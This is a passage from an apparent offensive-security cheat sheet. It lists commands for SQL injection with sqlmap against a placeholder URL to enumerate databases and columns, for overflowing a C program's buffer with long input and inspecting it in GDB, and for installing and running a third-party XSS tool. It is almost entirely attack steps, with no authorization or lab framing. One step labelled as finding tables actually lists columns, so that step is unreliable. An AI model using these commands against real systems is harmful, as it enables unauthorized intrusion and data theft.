3. SQL Injection with SQLmap
Install SQLmap:
sudo apt-get install sqlmap
Find database:
sqlmap -u [url] --batch --dbs
Find tables:
sqlmap -u [url] --batch -D [database_name] -T [table_name] --columns
4. Buffer Overflow Attack
Compile a C program:
gcc program.c -o output
Run with excessive input:
./output $(python3 -c "print('A' * 100)")
Debug with GDB:
gdb output
5. Cross-Site Scripting (XSS)
Install XSS-Freak tool:
git clone https://github.com/AssetX/XSS-Freak.git
Install dependencies:
sudo pip3 install -r requirements.txt
Run the tool:
python3 XSS-Freak.py -h
